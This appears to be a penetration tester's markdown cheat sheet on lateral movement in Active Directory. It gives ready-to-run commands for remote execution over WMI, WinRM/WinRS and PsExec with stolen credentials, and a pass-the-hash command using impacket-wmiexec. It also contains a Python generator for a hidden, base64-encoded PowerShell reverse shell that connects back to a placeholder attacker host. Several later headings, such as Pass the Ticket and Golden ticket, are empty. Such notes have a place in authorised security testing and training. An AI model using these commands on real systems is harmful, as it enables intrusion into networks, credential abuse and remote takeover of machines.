# Lateral movements in AD

## Techniques

### Windows Remote Management

#### WMI

Takes a local group `Administrators` account:

##### In `cmd`

Deprecated:
```
wmic /node:$TargetIp /user:somelocalAdminuser /password:somepass process call create "cmd"
```

##### In PowerShell

```
$username = 'user';
$password = 'pass';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName $VictimIP -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e somebase64string
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};
```

For a PowerShell reverse shell (in Python, replace the IP and Port): 
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("AttackerIp",AttackerPort); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

#### WinRM

##### In `cmd`: WinRS (Windows Remote Shell)
 
```
winrs -r:targethostname -u:user -p:pass  "powershell -nop -w hidden -e somebase64string"
```

##### In PowerShell

```
$username = 'user';
$password = 'pass';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName $VictimIp -Credential $credential

Enter-PSSession $winrm_session_number
```

### PsExec

Pre-requisites:
- user `targetuser` needs to be part of the `Administrators` local group
- the `ADMIN$` share must be available
- `File and Printer Sharing` has to be turned on

Uses Sysinternals: https://learn.microsoft.com/en-us/sysinternals/

```
C:\path\to\PsExec64.exe -i  \\targethostname -u targetdomain\targetuser -p somepass cmd
> hostname
> whoami
```

### Pass the Hash

```
/usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:somelonghashstring Administrator@VictimIP
```

### Overpass the Hash

### Pass the Ticket

### DCOM

## Persistence

### Golden ticket

### Shawdow copies


